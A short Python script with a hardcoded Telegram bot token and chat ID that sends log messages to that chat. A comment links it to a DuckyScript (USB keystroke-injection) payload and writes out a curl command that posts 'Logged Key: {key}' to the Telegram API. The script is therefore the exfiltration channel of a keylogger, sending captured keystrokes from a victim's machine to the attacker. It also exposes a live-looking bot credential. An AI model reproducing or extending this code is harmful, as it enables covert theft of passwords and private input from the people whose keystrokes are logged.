import telegram
import time

TOKEN = "8665518944:AAGN4ncP375c0rNFEsXiaOBN9G-0scYJ2qg"
CHAT_ID = "8298670259"

bot = telegram.Bot(token=TOKEN)

def send_log(message):
    try:
        bot.send_message(chat_id=CHAT_ID, text=message)
        print("Log sent successfully.")
    except Exception as e:
        print(f"Error sending log: {e}")

# In your DuckyScript, you would construct a message like:
# curl -s -X POST https://api.telegram.org/bot{TOKEN}/sendMessage -d chat_id={CHAT_ID} -d text="Logged Key: {key}"
# This would need to be dynamically generated within the DuckyScript or a helper script.
